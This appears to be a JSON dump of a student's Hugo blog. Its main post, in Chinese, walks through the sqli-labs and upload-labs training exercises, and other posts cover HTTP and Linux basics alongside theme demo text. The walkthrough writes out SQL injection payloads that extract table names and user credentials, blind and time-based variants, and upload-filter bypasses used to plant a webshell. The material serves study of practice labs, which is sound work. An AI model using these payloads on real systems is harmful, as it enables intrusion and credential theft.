[{"content":"一.初识php 1.php语法 php整个代码以\u003c?php开始，?\u003e结束，中间为脚本代码。\n如“hello world”\n1 2 3 \u0026lt;?php echo \u0026#34;hello world\u0026#34; ?\u0026gt; 作用为输出hello world\n2.php变量 一般在变量前加$，代表传输变量赋值，比如:\n$id,就是一个变量在sql注入中url中会有参数传递，也正是因为有参数传递所以才有sql注入的出现，\n比如url中会有/?id=1，id就是一个变量，而在php代码中，会写出“$id”,这个时候1就会传输给id变量。\nphp变量命名规则：\n以$开始，后面是变量名字 变量名必须是以字母或者下划线开始 变量只能包含字母，数字以及下划线 变量不能有空格 变量是区分大小写的 php当中也有变量作用域： local ，global，static ， parameter\nglobal是全局变量，声明了可以在整个代码中使用，static是静态变量，它不会被删除，\n3.echo/print echo可以输出字符\n比如：\n1 2 3 echo \u0026#34;hello world\u0026#34; $id=1 echo $id \u0026#39;\u0026#39;\u0026#39;输出变量id=1\u0026#39;\u0026#39;\u0026#39; echo和print的区别：\necho可以输出一个或者多个字符串且没有返回值，print只能输出一个且返回值为1 echo输出速度快 4.EOF 是定义一个字符串的方法\n\u0026laquo;\u0026lt;EOF开始 ，EOF结束，结束的标记必须顶格写不能有空格，且要有分号\n比如：\n1 2 3 4 5 6 7 8 \u0026lt;?php $name=\u0026#34;leo\u0026#34;; $id= \u0026lt;\u0026lt;\u0026lt;EOF \u0026#34;lili\u0026#34;$name \u0026#34;123\u0026#34; EOF; echo $id; ?\u0026gt; 5.php类型比较 弱类型比较 == ：只比较值，不比较类型。\n强类型比较 ===：即比较值，也比较类型。\n在web攻防中，会碰上缺陷函数绕过，这时就是通过== 和 ===进行绕过。如md5比较如果是弱类型比较它只会比较加密后的前两个字符是否相同：0e，\n若是===那么就必须通过数组绕过，因为md5不接受加密数组。\n6.php常量 1 bool define ( string $name , mixed $value [, bool $case_insensitive = false ] ) name ：常量名字\nvalue：常量的值\ncase_insensitive：若为TRUE,则常量大小写不敏感。\n注意使用时，常量不能带$，否则会报错\n7.php字符串 .可以把两个字符串链接在一起\n8.for 循环 foreach用于遍历数组\n1 2 3 4 foreach ($array as $value) { 要执行代码; } 二.sql注入 sql注入其实就是通过sql语句去执行数据库操作达到入侵的效果，主要看是否有参数传递，如果url没有参数传递，也可查看是否有账号登录这种post提交的方法，，查询方式包括会员注册，删除新闻，修改文章等等要与数据库进行交互的方式。\n第一关 通过输入‘来判断变量值是否是字符型注入还是数字型注入，第一关为字符型注入，因为我们输入了’后出现报错，为了方便，在源代码中我用echo $sql；让sql语句输出，可以更好的观看。\n1.猜列数\n使用语法order by 查看有几个回显位数，若是正确的位数则不会报错。- - +是屏蔽后面的limit 语句。\n获得有3位显示位后可以采取\n1 ?id=-1\u0026#39;union select 1,2,3--+ 为什么采取id=-1呢，因为如果id=1而此时id=1会放到数据库中去查询，刚好id=1是有值的，这个时候我们输入的select 1,2,3就没法回显到屏幕上，当然也可以采取id=100，若此时数据库中没有id=100，这时候就会爆出显示位。\n获得显示位后，就可以在显示位上运用函数或者sql语句进行信息搜集比如version()查看数据库版本，database()查看当前数据库。\n2.爆表\n通过mysql独有的information_schema库来得到该数据库的表\n1 ?id=-1\u0026#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39;--+ 这段代码是查询information_schema下的所有表，并且table_schema的值等于security，并且将这些表的名字通过group_concat函数联合起来\n3.爆字段\n1 ?id=-1\u0026#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39;--+ 跟爆表差不多就是查询字段名\n4.爆出用户名，密码\n1 ?id=-1\u0026#39; union select 1,2,group_concat(username ,id , password) from users--+ 第二关 第二关是数字型，不用‘注入，其他手段跟第一关一模一样，如何判断是否为数字型，通过id=1’- - +发现会报错，而id=1- -+不会报错是正常显示，说明是数字型。\n第五关 第五关无论我们输入什么都是显示you are in。。。，这个时候联合注入就没用了，我们可以用布尔盲注来注入。\n这里来说明一下：\n有数据库输出判断标准：基于布尔\n有数据库报错处理判断标准：基于报错\n都不需要：基于延时\n1 ?id=1\u0026#39;and length((select database()))\u0026gt;7--+ 判断数据库名字长度是否大于9\n若正确会显示you are in，错误则什么都不会显示。\n1 ?id=1\u0026#39;and ascii(substr((select database()),1,1))=115--+ 这句代码是取数据库名字的第一个字的ascii码，若等于115则显示正确。\n1 ?id=1\u0026#39;and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))\u0026gt;13--+ 这段代码是相当于关卡一爆表的代码只不过是看所有表的长度是否大于了13。\n1 ?id=1\u0026#39;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))\u0026gt;99--+ 通过这段代码挨个字符猜测长度来把每个表给猜出来\n1 ?id=1\u0026#39;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;))\u0026gt;20--+ 通过这段代码查看所有字段的长度\n1 ?id=1\u0026#39;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;),1,1))\u0026gt;99--+ 判断每个字段的每个字符的ascii码\n1 ?id=1\u0026#39; and length((select group_concat(username,password) from users))\u0026gt;109--+ 判断字段中所有内容的长度\n1 ?id=1\u0026#39; and ascii(substr((select group_concat(username,password) from users),1,1))\u0026gt;50--+ 猜测每个内容的每个字符的长度。\n第八关 第八关和第五关一样可以运用布尔盲注进行注入\n1 ?id=1\u0026#39;and length((select database()))\u0026gt;7--+ 判断数据库名字长度是否大于9\n若正确会显示you are in，错误则什么都不会显示。\n1 ?id=1\u0026#39;and ascii(substr((select database()),1,1))=115--+ 这句代码是取数据库名字的第一个字的ascii码，若等于115则显示正确。\n1 ?id=1\u0026#39;and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))\u0026gt;13--+ 这段代码是相当于关卡一爆表的代码只不过是看所有表的长度是否大于了13。\n1 ?id=1\u0026#39;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))\u0026gt;99--+ 通过这段代码挨个字符猜测长度来把每个表给猜出来\n1 ?id=1\u0026#39;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;))\u0026gt;20--+ 通过这段代码查看所有字段的长度\n1 ?id=1\u0026#39;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;),1,1))\u0026gt;99--+ 判断每个字段的每个字符的ascii码\n1 ?id=1\u0026#39; and length((select group_concat(username,password) from users))\u0026gt;109--+ 判断字段中所有内容的长度\n1 ?id=1\u0026#39; and ascii(substr((select group_concat(username,password) from users),1,1))\u0026gt;50--+ 猜测每个内容的每个字符的长度。\n第九关 第九关输入什么都是一样的这时我们可以用延时注入。\n这个语句就是延时注入，如果1=1则执行sleep(2)，否则执行1\n1 ?id=1\u0026#39; and if(1=1,sleep(2),1)--+ 那么我们可以得到以下代码，如果数据库名字长度大于9则执行sleep(2),否则执行1\n1 ?id=1\u0026#39;and if(length((select database()))\u0026gt;9,sleep(2),1)--+ 通过跟取ascii码拆分数据库每一个字符的ASCII码，若正确则执行sleep(2)\n1 ?id=1\u0026#39;and if(ascii(substr((select database()),1,1))=115,sleep(2),1)--+ 后面跟第五关语句基本类似\n1 2 3 4 5 6 7 8 9 10 11 12 13 ?id=1\u0026#39;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))\u0026gt;13,sleep(2),1)--+ ?id=1\u0026#39;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))\u0026gt;10,sleep(2),1)--+ ?id=1\u0026#39;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;))\u0026gt;10,sleep(2),1)--+ ?id=1\u0026#39;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;),1,1))\u0026gt;10,sleep(2),1)--+ ?id=1\u0026#39; and if(length((select group_concat(username,password) from users))\u0026gt;10,sleep(2),1)--+ ?id=1\u0026#39; and if(ascii(substr((select group_concat(username,password) from users),1,1))\u0026gt;10,sleep(2),1)--+ 三.upload-labs 第一关 查看源码发现是白名单。\n第一种\n上传php文件进行抓包，发现提示只能上传.jpg|.png|.gif文件，可能是前端检测，使用浏览器进行审查元素，发现有前端检测的函数，删除函数即可绕过。\n第二种\n上传jpg文件，进行抓包，在抓包软件中修改文件后缀，达到上传php文件\n连接蚁剑\n第二关 源码中$_FILES[\u0026lsquo;upload_file\u0026rsquo;] [\u0026rsquo;tmp_name\u0026rsquo;]文件被上传后在服务端储存的临时文件名，一般是系统默认。\n而$_FILES[\u0026lsquo;upload_file\u0026rsquo;] [\u0026rsquo;type\u0026rsquo;]是文件的 MIME 类型，需要浏览器提供该信息的支持，比如\u0026quot;image/gif\u0026quot;。\n发现是查看上传文件数据包中的Content-Type，我们只需要把类型修改为image/jpeg，image/png，image/gif就可以上传成功。\n下图是数据包\n第三关 查看源代码，发现是黑名单，\n1 2 3 4 5 6 7 8 9 10 if (isset($_POST[\u0026#39;submit\u0026#39;])) //存在提交文件进入 { if (file_exists(UPLOAD_PATH)) {//存在上传的路径进入 $deny_ext = array(\u0026#39;.asp\u0026#39;,\u0026#39;.aspx\u0026#39;,\u0026#39;.php\u0026#39;,\u0026#39;.jsp\u0026#39;);//定义一个黑名单数组 $file_name = trim($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, \u0026#39;.\u0026#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(\u0026#39;::$DATA\u0026#39;, \u0026#39;\u0026#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 trim函数，由于后面没有跟规定从字符串中删除哪些字符，则移除以下所有字符：\n\u0026ldquo;\\0\u0026rdquo; - NULL \u0026ldquo;\\t\u0026rdquo; - 制表符 \u0026ldquo;\\n\u0026rdquo; - 换行 \u0026ldquo;\\x0B\u0026rdquo; - 垂直制表符 \u0026ldquo;\\r\u0026rdquo; - 回车 \u0026quot; \u0026quot; - 空格 $_FILES[\u0026lsquo;upload_file\u0026rsquo;] [\u0026rsquo;name\u0026rsquo;]中传入的是客户端的原文件名字\n但是由于它没有屏蔽.php5 .php3 .phtml这种后缀，所以我们可以进行绕过，直接修改php后缀为.php5上传用蚁剑连接。\n但是注意此关要用phpstudy 2018进行，并且在apache服务器的配置文件httpd-conf中将\nAddType application/x-httpd-php .php 后加入.phtml .php5 .jpg这样就可以解析.php5 .phtml后缀的文件了，并且php的版本中不能带nts。\n第四关 第四关在第三关的基础上屏蔽了.php5 .php3 .phtml等文件后缀\n但是没有过滤.htaccess文件\n.htaccess文件：指在特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录\n我们可以在.htaccess中写入\n1 AddType application/x-httpd-php .php .phtml .php5 .jpg 这样就可以把这些文件当作php解析，再上传带有一句话木马的.jpg文件用蚁剑连接\n注意！！！.htaccess前不要带前缀比如1.htaccess！！\n第五关 第一种\n通过.user.ini进行绕过，进行此上传的前提有该上传目录必须要有php文件且.user,.ini得生效。\n并且php版本在5.的不能成功注入，在试了7.1.13版本可以注入，要查看自己的php版本是否可以使.user.ini生效可以去输入url加phpinfo.php，查看里面server api是否是CGI/FastCGI。\nphp.ini是php的一个全局配置文件，.user.ini和.htaccess都是配置文件，.user.ini是用户自定义的一个php.ini。通过创建一个.user.ini文件在里面写入\n1 auto_prepend_file = 5.jpg 5.jpg是我们创建的一个包含一句话木马的jpg文件\n上传上去，打开图片链接，并且把图片名字改为readme.php用蚁剑链接这个地址就可以了。\n第二种\n注意！！这种绕过7.1.13版本不能，5.4.45可以\n由于它的过滤不是循环过滤，而是只过滤一次就结束，可以使用. .进行绕过\n这是由于Windows会帮我们把文件后面的.自动删除\n如果我们上传一个1.php. .文件，根据它的过滤规则，首先获取我们上传的文件名，再删除后面的.，这时我们获取的是1.php. ，再由\n1 strrchr($file_name, \u0026#39;.\u0026#39;)； 我们获得.后面的的也就是. ，再将首尾去空我们最终得到 $file_name为1.php.\n$file_ext中存的值为.。由下面的代码\n1 $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.$file_name; 根据上路径和$file_name进行拼接则可以成功绕过\n第六关 第六关很简单，也是黑名单但是没有前几关的大小写判断，所以抓包修改文件后缀为.phP 就可以绕过\n1 $file_ext = strtolower($file_ext); //转换为小写 注意！！！第六关如果访问上传文件出现500错误，换成nginx服务器或者降低版本\n第七关 第七关发现没有进行空格删除\n1 $file_ext = trim($file_ext); //收尾去空 所有以抓包在文件后缀后面加入一个空格就可以绕过。\n第八关 这一关比前几关少了一个删除.的函数\n1 $file_name = deldot($file_name);//删除文件名末尾的点 所以我们可以抓包在上传文件后缀后加一个.进行绕过。\n第九关 在Windows系统中，文件名后面跟一个“::$DATA“,表示文件的一个附加的数据流，大部分文件操作工具不会意识到这些数据流。\n我们可以上传php文件抓包在其后缀后面加入::$DATA，就可以成功被解析。\n在windows系统下我们上传的这个后缀的后面::$DATA会自动被删除。\n连接成功\n第十关 第十关和第五关第二种方法一样\n第二种\n注意！！这种绕过7.1.13版本不能，5.4.45可以\n由于它的过滤不是循环过滤，而是只过滤一次就结束，可以使用. .进行绕过\n这是由于Windows会帮我们把文件后面的.自动删除\n如果我们上传一个1.php. .文件，根据它的过滤规则，首先获取我们上传的文件名，再删除后面的.，这时我们获取的是1.php. ，再由\n1 strrchr($file_name, \u0026#39;.\u0026#39;)； 我们获得.后面的的也就是. ，再将首尾去空我们最终得到 $file_name为1.php.\n$file_ext中存的值为.。由下面的代码\n1 $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.$file_name; 根据上路径和$file_name进行拼接则可以成功绕过\n","date":"2024-09-27T15:32:07+08:00","permalink":"https://baoanleo.github.io/p/task1/","title":"Task1"},{"content":"image = \u0026ldquo;懒羊羊.jpg\u0026rdquo;\n","date":"2024-09-23T21:16:10+08:00","permalink":"https://baoanleo.github.io/p/testimg/","title":"Testimg"},{"content":"task0 http协议 HTTP协议（超文本传输协议）是用于在Web服务器和客户端之间传输超文本数据的协议。它是TCP/IP协议族的一部分，广泛应用于分布式、协作式和超媒体信息系统。HTTP基于请求/响应模式，是一种无状态协议，意味着每个请求/响应交换是独立的，服务器不会保存任何关于客户端之前请求的信息。在url请求的最前面就会有http协议，http也分为1.0，1.1，2.0。\n1.0是无连接，无状态的，无连接是每次请求都要建立连接，需要使用 keep-alive 参数建立长连接、http1.1默认长连接keep-alive，无法复用连接，每次发送请求都要进行TCP连接，TCP的连接释放都比较费事，会导致网络利用率低。\n1.1是无状态，长连接，所以是现在广泛使用的\n2.0是基于https的，它比1.1更加安全，http2.0会压缩头部header，例如如果同时多个请求其头部一样或相似，那么协议会消除重复部分\n状态码 HTTP状态码是服务器返回给客户端的3位数字代码，用于表示请求的结果。状态码分为五类：\n1xx - 信息性状态码：表示请求已接收、继续处理。\n2xx - 成功状态码：表示请求成功，例如200 OK。\n3xx - 重定向状态码：表示需要客户端采取进一步行动，例如301永久重定向。\n4xx - 客户端错误状态码：表示客户端的请求有误，例如404 Not Found。\n5xx - 服务器错误状态码：表示服务器无法处理请求，例如500 Internal Server Error。\n主要两种请求方式 主要分为get请求和post请求\nget请求 用于请求服务器发送资源，get意思是取，相当于从从服务器取得资源。多次发送GET请求不会改变资源的状态。 请求头中的主要字段包括：\nHost：指定请求的服务器的域名。 Accept：指定客户端能够接收的内容类型。 Content-Type：指定客户端发送的数据类型。 Cookie：存储在客户端的会话信息。\npost请求 用于向服务器提交数据。post意思是贴，相当于向服务器传送数据，POST请求通常用于创建或更新资源。 请求头中的主要字段包括：\nHost：指定请求的服务器的域名。 Accept：指定客户端能够接收的内容类型。 Content-Type：指定客户端发送的数据类型，如application/x-www-form-urlencoded。 Content-Length：指定请求体的长度。 Authorization：用于认证的凭证信息，比如token数据。\n各个请求头的含义 一个典型的HTTP请求报文由以下部分组成：\n请求行：包括方法（如GET、POST）、路径（如/workshop/api/mechanic/mechanic_report）和HTTP版本（如HTTP/1.1）。 请求头：包含各种元数据，如Host、Accept、Content-Type等。 空行：用于分隔请求头和请求体。 请求体：通常用于POST请求，携带要提交的数据，get请求的数据一般跟在路径后，比如/api/mechanic/mechanic_report?x=1这种。 常见请求头字段含义\nHost：指定请求的服务器的域名。 Accept：指定客户端能够接收的内容类型，如text/html、application/json。 Content-Type：指定客户端发送的数据类型，如application/x-www-form-urlencoded、application/json。 Content-Length：指定请求体的长度。 Authorization：提供认证信息，如Bearer token。 Cookie：用于发送会话信息，维持登录状态。 User-Agent：标识客户端软件的信息，服务器可以通过这个字段了解客户端的软件环境。 linux操作 文件，目录，软连接的操作\n创建文件：touch file.txt 创建目录：mkdir 目录名称 删除文件：rm file.txt 删除目录：rmdir 目录名称（需要目录为空） 移动文件或目录：mv file1 目录名称/ 或 mv 目录名称1 目录名称2 复制文件或目录：cp file1 file2 或 cp -r 目录名称1 目录名称2（递归复制） 查看文件内容：cat file.txt 查看目录内容：ls 查看文件权限：ls -l 修改文件权限：chmod 755 file.txt 分为文件所有者、用户组、其它用户，每一个都能拥有读写执行权(r,w,x),7代表给文件所有者的权限为4+2+1其中r为4，w为2，x为1，5为r为4，w为0，x为1。 修改文件所有者：chown user:group file.txt eg：1.chown newuser filename 将filename所有者权限改为newuser 2 chown newuser:newgroup filename 这个命令将文件将filename所有者改为newuser，且将组改为newgroup 创建软链接：ln -s /path/to/original /path/to/link 创建硬链接：ln /path/to/original /path/to/link 用户和权限管理\n添加用户：useradd username 删除用户：userdel username 修改用户密码：passwd username 查看用户列表：who 或 w 查看当前用户：whoami 切换用户：su - username 或 su username ** groupadd/groupdel/groupmod 用于管理用户组** 系统信息和监控\n查看系统信息：uname -a 查看系统负载：top 或 htop 查看进程列表：ps 或 pstree 查看网络流量：ifconfig 或 ip 查看磁盘使用情况：df -h 查看日志文件：journalctl 文本处理命令\nsed：用于流编辑，可以进行查找、替换、插入等操作。 eg：nl /etc/passwd | sed \u0026lsquo;2d\u0026rsquo; //删除第二行\n​ sed \u0026lsquo;2a drink tea\u0026rsquo; //在第二行下面追加一行\u0026quot;drink tea\u0026quot;，a代表append\n​ sed -n \u0026lsquo;5,7p\u0026rsquo;　//选取第5到7行输出，必须加-n参数，不然效果就是所有行都被输出，而5到7行输出两次。\n​ sed \u0026lsquo;2,5c No 25 lines\u0026rsquo;　//将第2到5行替换为一行字符串\u0026quot;No 25 lines\u0026quot;\nawk：用于模式扫描和处理语言，适用于处理文本和数据。 eg：awk \u0026lsquo;{print $1}\u0026rsquo; file.txt 此处\u0026rsquo;print’表示awk程序，而file.txt则为输入的文件名称。 grep：用于搜索文件中匹配特定模式的文本行。 eg：grep [option] pattern file\nSSH远程登录\n启动SSH客户端：ssh username@host 端口转发：ssh -L local_port:remote_host:remote_port username@host 密码less登录：ssh-keygen 生成密钥对，ssh-copy-id 将公钥复制到远程服务器 计划任务 使用cron：crontab -e 编辑crontab文件，设置定时任务。 常见URL请求协议 常见URL请求协议主要有以下几种：\nhttp：超文本传输协议，是互联网上应用最为广泛的网络传输协议。 https：安全超文本传输协议，是http协议的安全版本，通过SSL/TLS协议加密数据传输。 FTP：文件传输协议，用于在网络中传输文件。 FTPS：安全文件传输协议，是FTP协议的安全版本，通过SSL/TLS协议加密数据传输。 SMTP：简单邮件传输协议，用于发送和接收电子邮件。 IMAP/POP3：用于接收电子邮件的协议，IMAP用于访问服务器上的邮箱，POP3用于下载邮件到本地。 常见HTTP请求方法 get：请求获取服务器上的指定资源。 post：提交数据到服务器，通常用于表单提交或上传文件。 put：请求服务器存储一个资源或更新现有资源。 delete：请求服务器删除一个资源。 head：类似于GET请求，但是只请求头的信息，不请求主体内容。 options：请求查询服务器的性能和支持的HTTP请求方法。 patch：对资源进行部分更新。 GET和POST请求的差别：\nget post 能被缓存 不能缓存 不安全，因为请求时会在url后传参 POST 比 GET 更安全，因为参数不会被保存在浏览器历史或 web 服务器日志中 数据在 URL 中对所有人都是可见的。 数据不会显示在 URL 中。 有限制。当发送数据时，GET 方法向 URL 添加数据；URL 的长度是受限制的（URL 的最大长度是 2048 个字符）。 无限制。 无害 数据会被重新提交（浏览器应该告知用户数据会被重新提交）。 日常生活中什么时候会用GET，什么时候会用POST：\n使用get情况：\n浏览网页，请求网页内容，比如在博客网站?id=1是一个用户,?id=2是另一个用户。 查询天气、股票信息等。 获取网站的公共数据，如目录、列表等。 使用post情况包括：\n登录网站，向网站提交用户名和密码。 提交表单，比如搜索框中的内容、购物车信息和购买的信息等。 上传文件到服务器上去。 对web的认知 Web渗透测试是一个专门研究如何发现和利用Web应用程序中的安全漏洞的领域。它涉及到对Web服务器、应用程序代码、数据库和整体网络环境的安全性评估。Web渗透测试的主要目的是为了发现可能被攻击者利用的漏洞，以便提前进行修复，确保Web系统的安全性。\n信息收集：通过黑暗搜索引擎、社交媒体等渠道收集目标网站的信息，包括网站组成、技术组成、人员信息等。 静态网页分析：对Web应用的HTML、CSS、JavaScript代码进行审查，寻找编码错误、敏感信息泄露等问题。 动态分析：通过与Web应用交互，模拟用户的行为，进行功能测试和漏洞探测。这可能包括SQL注入、XSS攻击、CSRF攻击等。 源码分析：如果是黑盒测试，也可以通过代码审计进行判断，如果不是黑盒也可以制造出黑盒来，比如通过前端中的一些信息可以找到搭建的框架的名称或者是网上有对应的源码，下载下来即可代码审计，如果是框架可以寻找网上的公开漏洞。 抓包分析：通过burpsuite，hiddler，charles等软件进行抓包，可以尝试对前端进行绕过，比如登录时若采取javascript语言进行验证，则可以通过抓包绕过验证，但是如果是后端用php语言进行验证则不能成功。 封包软件：通过封包整体测试触发事件数据包 编码问题：大多flag会由编码进行加密，我们需要用解密来将其提取出来，如base64编码特征是结尾通常有个=号 多站点：可能出现一个地址不同端口不同网站的问题，这个时候可以用黑暗引擎去扫描也可使用软件去探测。 网站扫描：在web渗透中，我们可以使用域名扫描去探测它们所有的域名，有些域名中就是关键。 漏洞扫描：使用自动化工具对Web应用进行安全扫描，识别已知的漏洞。 利用测试：对发现的漏洞进行实际利用，以验证漏洞的影响范围和严重程度。 ","date":"2024-09-17T21:18:46+08:00","permalink":"https://baoanleo.github.io/p/task00/","title":"Task00"},{"content":"##这是我的第二次\n","date":"2024-09-17T17:46:38+08:00","permalink":"https://baoanleo.github.io/p/newnewnew/","title":"Newnewnew"},{"content":"Hello World ","date":"2024-09-15T20:26:21+08:00","permalink":"https://baoanleo.github.io/p/myfirstblog/","title":"MyFirstBlog"},{"content":"正文测试 而这些并不是完全重要，更加重要的问题是， 带着这些问题，我们来审视一下学生会退会。 既然如何， 对我个人而言，学生会退会不仅仅是一个重大的事件，还可能会改变我的人生。 我们不得不面对一个非常尴尬的事实，那就是， 可是，即使是这样，学生会退会的出现仍然代表了一定的意义。 学生会退会，发生了会如何，不发生又会如何。 经过上述讨论， 生活中，若学生会退会出现了，我们就不得不考虑它出现了的事实。 学生会退会，到底应该如何实现。 这样看来， 在这种困难的抉择下，本人思来想去，寝食难安。 对我个人而言，学生会退会不仅仅是一个重大的事件，还可能会改变我的人生。 就我个人来说，学生会退会对我的意义，不能不说非常重大。 莎士比亚曾经提到过，人的一生是短的，但如果卑劣地过这一生，就太长了。这似乎解答了我的疑惑。 莫扎特说过一句富有哲理的话，谁和我一样用功，谁就会和我一样成功。这启发了我， 对我个人而言，学生会退会不仅仅是一个重大的事件，还可能会改变我的人生。 学生会退会，到底应该如何实现。 一般来说， 从这个角度来看， 这种事实对本人来说意义重大，相信对这个世界也是有一定意义的。 在这种困难的抉择下，本人思来想去，寝食难安。 了解清楚学生会退会到底是一种怎么样的存在，是解决一切问题的关键。 一般来说， 生活中，若学生会退会出现了，我们就不得不考虑它出现了的事实。 问题的关键究竟为何？ 而这些并不是完全重要，更加重要的问题是。\n奥斯特洛夫斯基曾经说过，共同的事业，共同的斗争，可以使人们产生忍受一切的力量。　带着这句话，我们还要更加慎重的审视这个问题： 一般来讲，我们都必须务必慎重的考虑考虑。 既然如此， 这种事实对本人来说意义重大，相信对这个世界也是有一定意义的。 带着这些问题，我们来审视一下学生会退会。 我认为， 我认为， 在这种困难的抉择下，本人思来想去，寝食难安。 问题的关键究竟为何？ 每个人都不得不面对这些问题。 在面对这种问题时， 要想清楚，学生会退会，到底是一种怎么样的存在。 我认为， 既然如此， 每个人都不得不面对这些问题。 在面对这种问题时， 那么， 我认为， 学生会退会因何而发生。\n引用 思念是最暖的忧伤像一双翅膀\n让我停不了飞不远在过往游荡\n不告而别的你 就算为了我着想\n这么沉痛的呵护 我怎么能翱翔\n最暖的憂傷 - 田馥甄\n图片 1 2 3 ![Photo by Florian Klauer on Unsplash](florian-klauer-nptLmg6jqDo-unsplash.jpg) ![Photo by Luca Bravo on Unsplash](luca-bravo-alS7ewQ41M8-unsplash.jpg) ![Photo by Helena Hertz on Unsplash](helena-hertz-wWZzXlDpMog-unsplash.jpg) ![Photo by Hudai Gayiran on Unsplash](hudai-gayiran-3Od_VKcDEAA-unsplash.jpg) 相册语法来自 Typlog\n","date":"2020-09-09T00:00:00Z","image":"https://baoanleo.github.io/p/test-chinese/helena-hertz-wWZzXlDpMog-unsplash_hu4699868770670889127.jpg","permalink":"https://baoanleo.github.io/p/test-chinese/","title":"Chinese Test"},{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution Tiam, ad mint andaepu dandae nostion secatur sequo quae. Note that you can use Markdown syntax within a blockquote.\nBlockquote with attribution Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\n— Rob Pike1\nTables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\nName Age Bob 27 Alice 23 Inline Markdown within tables Italics Bold Code italics bold code A B C D E F Lorem ipsum dolor sit amet, consectetur adipiscing elit. Phasellus ultricies, sapien non euismod aliquam, dui ligula tincidunt odio, at accumsan nulla sapien eget ex. Proin eleifend dictum ipsum, non euismod ipsum pulvinar et. Vivamus sollicitudin, quam in pulvinar aliquam, metus elit pretium purus Proin sit amet velit nec enim imperdiet vehicula. Ut bibendum vestibulum quam, eu egestas turpis gravida nec Sed scelerisque nec turpis vel viverra. Vivamus vitae pretium sapien Code Blocks Code block with backticks 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block with Hugo\u0026rsquo;s internal highlight shortcode 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Diff code block 1 2 3 4 5 [dependencies.bevy] git = \u0026#34;https://github.com/bevyengine/bevy\u0026#34; rev = \u0026#34;11f52b8c72fc3a568e8bb4a4cd1f3eb025ac2e13\u0026#34; - features = [\u0026#34;dynamic\u0026#34;] + features = [\u0026#34;jpeg\u0026#34;, \u0026#34;dynamic\u0026#34;] List Types Ordered List First item Second item Third item Unordered List List item Another item And another item Nested list Fruit Apple Orange Banana Dairy Milk Cheese Other Elements — abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL + ALT + Delete to end the session.\nMost salamanders are 